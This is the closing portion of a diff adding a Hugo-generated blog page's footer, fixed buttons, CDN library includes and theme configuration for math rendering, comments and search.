+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.132.2">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/copy-tex.min.css"><script type="text/javascript" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v5.0&amp;appId=2950291851778582&amp;autoLogAppEvents=1" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":100},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"g03m0n/comments"}},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","maxResultLength":20,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
